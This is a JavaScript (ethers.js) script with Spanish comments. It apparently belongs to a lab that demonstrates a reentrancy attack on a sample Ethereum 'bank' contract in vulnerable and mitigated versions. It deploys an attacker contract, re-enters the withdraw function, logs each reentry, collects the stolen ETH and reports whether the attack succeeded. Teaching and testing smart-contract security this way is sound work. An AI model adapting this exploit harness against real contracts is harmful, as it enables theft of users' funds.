// ATAQUE 1 — Reentrancy
// Uso: node reentrancy.js vulnerable|mitigada
const { conectar, eth, motivo, ethers } = require("./comun");

(async () => {
  const modo = process.argv[2];
  const { provider, atacante, banco, info } = await conectar(modo);
  const dirBanco = await banco.getAddress();

  console.log(`\n=== REENTRANCY contra la versión ${modo.toUpperCase()} ===`);
  console.log(`Banco:    ${dirBanco}`);
  console.log(`Atacante: ${atacante.address}`);
  const antes = await banco.balanceContrato();
  console.log(`Balance del banco antes: ${eth(antes)} ETH\n`);

  console.log("[1] Desplegando contrato Atacante…");
  const fabrica = new ethers.ContractFactory(info.atacante.abi, info.atacante.bytecode, atacante);
  const contrato = await fabrica.deploy(dirBanco);
  await contrato.waitForDeployment();
  console.log(`    Atacante.sol en ${await contrato.getAddress()}`);

  console.log("[2] atacar(): deposita 1 ETH y llama a retirar()…");
  try {
    const tx = await contrato.atacar({ value: ethers.parseEther("1"), gasLimit: 3_000_000 });
    const recibo = await tx.wait();
    for (const log of recibo.logs) {
      try {
        const ev = contrato.interface.parseLog(log);
        if (ev && ev.name === "Reentrada") console.log(`    ↳ Reentrada #${ev.args.numero} (banco con ${eth(ev.args.balanceBanco)} ETH)`);
      } catch {}
    }
  } catch (e) {
    let razon = motivo(e);
    try { await contrato.atacar.staticCall({ value: ethers.parseEther("1"), gasLimit: 3_000_000 }); }
    catch (e2) { razon = motivo(e2); }
    console.log(`    ✘ La transacción revirtió: ${razon}`);
  }

  const despues = await banco.balanceContrato();
  const botin = await provider.getBalance(await contrato.getAddress());
  if (botin > 0n) await (await contrato.retirarBotin()).wait();

  console.log(`\nBalance del banco después: ${eth(despues)} ETH`);
  console.log(despues < antes
    ? `RESULTADO: ATAQUE EXITOSO — se robaron ${eth(antes - despues)} ETH\n`
    : "RESULTADO: ATAQUE BLOQUEADO — el banco conserva sus fondos\n");
})().catch((e) => { console.error("Error:", e.message); process.exit(1); });
